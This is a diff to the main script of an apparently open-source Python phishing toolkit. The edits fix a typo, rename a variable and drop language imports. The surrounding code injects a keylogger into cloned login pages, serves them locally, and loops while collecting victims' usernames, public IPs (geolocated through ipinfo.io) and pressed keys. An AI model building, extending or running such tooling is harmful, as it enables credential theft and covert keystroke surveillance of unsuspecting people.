@@ -10,10 +10,7 @@ from subprocess import check_output, CalledProcessError
 from sys import stdout, argv, exit
 from Defs.ThemesManager import ThemeManager
 from Defs.Configurations import readConfig, ifSettingsNotExists
-from Defs.Languages import *
 
-installGetText()
-languageSelector()
 ifSettingsNotExists()
 config = readConfig()
 
@@ -543,7 +540,7 @@ def addkeylogger():
          f = open('Server/www/index.html', 'w')
          f.write(c)
          f.close()
-         print("\n{0}[{1}#{0}]Keylgger{0} ADDED !!!").format(MAIN0, MAIN4)
+         print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!").format(MAIN0, MAIN4)
          sleep(2)
      else:
          with open('Server/www/index.php') as f:
@@ -552,7 +549,7 @@ def addkeylogger():
          f = open('Server/www/index.php', 'w')
          f.write(c)
          f.close()
-         print("\n{0}[{1}#{0}]Keylgger{0} ADDED !!!").format(MAIN0, MAIN4)
+         print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!").format(MAIN0, MAIN4)
          sleep(2)
 
 def runServer(port):
@@ -590,22 +587,22 @@ def getCredentials(port):
     print("{2}.........................................................................\n{0}[{1}!{0}]{1} IF FOUND {2}SEGMENTATION FAULT{1}, IT MEANS THE SERVER FAILED.            {2}| \n{0}[{1}!{0}]{1} THEN YOU HAVE TO RUN IT AGAIN.                                      {2}| \n{0}[{1}!{0}]{1} Use This Command In Another Terminal.                               {2}| \n{0}({2}cd Server/www/ && php -S 127.0.0.1:{3} > /dev/null{0})                   {2}| \n{2}.........................................................................   \n\n").format(MAIN2, MAIN2, MAIN0, port)
     print("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n\n{2}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n").format(MAIN0, MAIN2, MAIN4)
     while True:
-        with open('Server/www/usernames.txt') as creds:
-            lines = creds.read().rstrip()
+        with open('Server/www/usernames.txt') as credentials:
+            lines = credentials.read().rstrip()
             if len(lines) != 0:
                 writeLog('{}..................................................................'.format(MAIN3))
                 writeLog(' {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}').format(MAIN2, MAIN3, lines)
                 system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
                 writeLog('{}..................................................................'.format(MAIN3))
 
-        creds.close()
+        credentials.close()
 
 
-        with open('Server/www/ip.txt') as creds:
-            lines = creds.read().rstrip()
+        with open('Server/www/ip.txt') as credentials:
+            lines = credentials.read().rstrip()
             if len(lines) != 0:
                 ip = re.match('Victim Public IP: (.*.*.*)\n', lines).group(1)
-                user = re.match('Current logged in user: (a-z0-9)\n', lines)
+                user = re.match('Current logged in user: (a-z0-9)\n', lines) #FIXME
                 resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
@@ -623,10 +620,10 @@ def getCredentials(port):
                 system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
                 writeLog('..................................................................')
 
-        creds.close()
+        credentials.close()
 
-        with open('Server/www/KeyloggerData.txt') as creds:
-            lines = creds.read().rstrip()
+        with open('Server/www/KeyloggerData.txt') as credentials:
+            lines = credentials.read().rstrip()
             if len(lines) != 0:
                 writeLog('{}...............................'.format(MAIN0))
                 writeLog(' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}'.format(MAIN3, MAIN2, lines))
@@ -634,7 +631,7 @@ def getCredentials(port):
                 writeLog('{}...............................'.format(MAIN0))
 
 
-        creds.close()
+        credentials.close()
 
 def writeLog(ctx): #Writing log
     if config.get("Settings", "DidBackground") == "True": #if didBackground == True, write
